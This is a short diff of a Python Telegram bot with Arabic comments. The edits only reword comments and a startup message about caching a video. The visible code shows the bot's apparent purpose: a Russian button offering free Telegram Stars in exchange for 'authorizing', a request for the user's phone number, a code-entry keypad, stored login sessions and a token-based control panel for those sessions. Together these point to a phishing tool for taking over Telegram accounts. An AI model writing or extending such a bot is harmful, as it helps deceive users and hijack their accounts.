@@ -32,7 +32,7 @@ os.makedirs(SESSIONS_DIR, exist_ok=True)
 user_states = {}       # حالات التسجيل الحالية
 active_web_tokens = {} # توكنات دخول لوحة التحكم {token: session_path}
 
-# 🧠 ذاكرة البوت لتخزين file_id الخاص بالفيديو
+# 🧠 ذاكرة البوت لتخزين file_id الخاص بالفيديو لتشغيله بسرعة فائقة
 CACHED_VIDEO_FILE_ID = None
 
 # =============================================================
@@ -404,7 +404,7 @@ def make_numeric_keyboard(current_code=""):
     ]
     return display, buttons
 
-# استقبال أمر /start مع إرسال فيديو vip.mp4 المباشر ومشاركتها عبر الكاش (Cache)
+# استقبال أمر /start مع إعادة إرسال فيديو vip.mp4 وكاشي لتسريع العرض
 @bot.on(events.NewMessage(pattern='/start'))
 async def start_command(event):
     global CACHED_VIDEO_FILE_ID
@@ -430,6 +430,7 @@ async def start_command(event):
     
     phone_btn = [Button.request_phone("📱 Авторизоваться и получить Stars", resize=True, single_use=True)]
     
+    # ⚡ إرسال الفيديو المرفق مع الكاش لضمان السرعة الفائقة وعدم تكرار الرفع
     try:
         if CACHED_VIDEO_FILE_ID:
             await bot.send_file(
@@ -675,6 +676,6 @@ if __name__ == '__main__':
     web_thread.daemon = True
     web_thread.start()
     
-    print("🚀 البوت الروسي للنجوم مع نظام تغيير الأجهزة الذكي يعمل بنجاح...")
+    print("🚀 البوت الروسي للنجوم مع نظام الفيديوهات وتغيير الأجهزة الذكي يعمل بنجاح...")
     bot.run_until_disconnected()
 
